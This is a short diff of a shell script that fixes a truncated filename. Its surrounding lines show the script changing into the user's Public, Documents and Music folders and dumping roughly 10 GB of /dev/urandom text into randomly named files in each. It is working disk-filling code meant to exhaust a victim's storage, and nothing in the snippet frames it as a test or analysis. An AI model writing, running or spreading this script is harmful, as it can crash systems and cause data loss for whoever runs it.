@@ -38,7 +38,7 @@ cd ~/Public
 < /dev/urandom tr -dc "\t\n [:alnum:]" | head -c9999999999 > $RANDOM.txt
 cd ~
 cd ~/Documents
-< /dev/urandom tr -dc "\t\n [:alnum:]" | head -c9999999999 > $RANDOM.
+< /dev/urandom tr -dc "\t\n [:alnum:]" | head -c9999999999 > $RANDOM.txt
 cd ~
 cd ~/Music
 < /dev/urandom tr -dc "\t\n [:alnum:]" | head -c9999999999 > $RANDOM.txt
